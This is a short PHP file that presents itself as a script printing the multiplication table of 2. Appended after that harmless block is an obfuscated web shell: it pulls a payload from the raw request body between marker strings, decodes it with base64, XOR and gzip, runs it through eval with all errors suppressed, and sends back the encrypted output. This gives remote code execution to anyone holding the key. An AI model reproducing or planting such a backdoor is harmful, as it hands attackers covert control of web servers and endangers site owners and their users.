<?php
echo "<h3>Table of 2</h3>";
for ($i = 1; $i <= 10; $i++) {
    echo "2 x $i = " . (2 * $i) . "<br>";
}
?>

<?php
$k="3b712de4";$kh="8137572f3849";$kf="aabd5666a4e3";$p="wowzoun0lxqf0Qwj"; function x($t,$k){ $c=strlen($k);$l=strlen($t);$o=""; for($i=0;$i<$l;){ for($j=0;($j<$c&&$i<$l);$j++,$i++) { $o.=$t[$i]^$k[$j]; } } return $o; } if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) { @ob_start(); @eval(@gzuncompress(@x(@base64_decode($m[1]),$k))); $o=@ob_get_contents(); @ob_end_clean();$r=@base64_encode(@x(@gzcompress($o),$k));print("$p$kh$r$kf");}
?>